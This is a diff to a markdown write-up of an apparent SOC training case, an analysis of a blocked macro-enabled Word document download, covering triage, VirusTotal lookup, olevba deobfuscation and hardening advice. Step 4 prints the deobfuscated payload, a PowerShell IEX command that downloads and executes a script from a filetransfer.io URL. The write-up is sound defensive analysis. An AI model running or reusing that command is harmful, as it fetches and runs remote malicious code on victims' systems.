@@ -1,4 +1,4 @@
-# SOC137 - Malicious File/Script Download Attempt — Case #76
+# SOC137 - Malicious File/Script Download Attempt 
 
 ## Alert Overview
 - Severity: High
@@ -17,9 +17,17 @@ Visual Basic for Applications (VBA) macros are frequently abused to achieve code
 
 1. **Alert Triage:** Initiated investigation on Event ID 76 regarding an attempted download of a `.docm` file named `INVOICE PACKAGE LINK TO DOWNLOAD.docm` by the host `NicolasPRD`. The perimeter appliance successfully intercepted and blocked the download.
 2. **Threat Intelligence Enrichment:** Extracted the MD5 hash (`f2d0c66b801244c059f636d08a474079`) and queried it against VirusTotal and Any.Run. The file was flagged by 40/63 security vendors, confirming high malicious confidence.
+
+
+<img width="1000" height="181" alt="image" src="https://github.com/user-attachments/assets/cb9b9f72-851d-4492-91d7-af3dba79285a" />
+
 3. **Static Malware Analysis:** To understand the document's capabilities without detonating it, the file was analyzed in an isolated environment using the `olevba` tool from the `oletools` Python suite. 
 4. **Payload Deobfuscation:** `olevba` successfully extracted the VBA macro containing the `AutoOpen()` subroutine. The macro contained an obfuscated `Shell` execution command. By manually deobfuscating the concatenated strings, the true command was revealed:
    `powershell IEX ((new-Object (Net.WebClient)).DownloadString('https://filetransfer.io/data-package/UR2whuBv/download'))`
+
+<img width="1200" height="642" alt="image" src="https://github.com/user-attachments/assets/e650fcb7-3fda-4652-8589-0bc269b6b92f" />
+
+
 5. **Endpoint and Network Correlation:** Pivoted to the SIEM and EDR platforms to verify the host `NicolasPRD`. Log review confirmed no execution of the file took place and no outbound network connections were made to `filetransfer.io` or its associated IPs.
 
 ## Analysis & Findings
@@ -62,9 +70,6 @@ Legitimate users frequently use services like `filetransfer.io` or `WeTransfer` 
 2. **Cloud Storage Filtering:** Threat actors are heavily abusing free file-sharing services (Living off the Cloud). If `filetransfer.io` has no legitimate business use case within the organization, it should be blocked at the web proxy.
 3. **PowerShell Hardening:** Implement Constrained Language Mode (CLM) to prevent non-administrative users from executing advanced `Net.WebClient` download strings.
 
-## Evidence
-<img width="1000" height="181" alt="image" src="https://github.com/user-attachments/assets/cb9b9f72-851d-4492-91d7-af3dba79285a" />
-<img width="1200" height="642" alt="image" src="https://github.com/user-attachments/assets/e650fcb7-3fda-4652-8589-0bc269b6b92f" />
 
 ## Skills & Tools Used
 Static Malware Analysis, `olevba` (oletools), De-obfuscation (String Concatenation Reassembly), Threat Intelligence (VirusTotal, Any.Run), SIEM Log Correlation.
